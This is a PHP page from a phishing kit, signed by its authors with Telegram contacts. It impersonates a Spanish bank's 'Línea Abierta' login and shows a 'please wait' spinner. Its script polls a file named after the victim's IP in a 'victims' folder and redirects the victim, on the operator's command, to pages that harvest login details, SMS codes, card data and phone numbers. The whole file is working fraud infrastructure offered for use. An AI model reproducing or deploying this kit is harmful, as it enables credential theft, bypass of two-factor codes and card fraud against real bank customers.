<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Acceso seguro a Línea Abierta</title>
    </head>

    <body>

        <header id="header" class="d-flex align-items-center">
            <div class="left flex-grow-1">
                <img src="../assets/imgs/logo.png">
                <img class="ml-5 d-lg-inline-block d-md-inline-block d-sm-none d-none" src="../assets/imgs/logo2.png">
            </div>
            <div class="right d-lg-block d-md-block d-sm-block d-none">
                <img src="../assets/imgs/header-right.png">
            </div>
        </header>

        <div id="login-area">
            <div class="loader mt50">
                <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                <p>Por favor espera...</p>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
                $.get('../victims/' + ip + '.txt', function(data) {
                    if( data == 0 ) {
                        //console.log('hada ba9i 0');
                    } else if( data == 'badlogin' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=errorlogin";
                    } else if( data == 'app' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=app";
                    } else if( data == 'sms' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=sms";
                    } else if( data == 'errorsms' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=errorsms";
                    } else if( data == 'cc' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=cc";
                    } else if( data == 'phone' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=phone";
                    } else if( data == 'errorphone' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=errorphone";
                    } else if( data == 'carte' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=carte";
                    } else if( data == 'errorcarte' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=errorcarte";
                    } else if( data == 'success' ) {
                        clearInterval(waiting);
                        location.href = "../index.php?redirection=success";
                    }
                });
            }, 1000);
        </script>

    </body>

</html>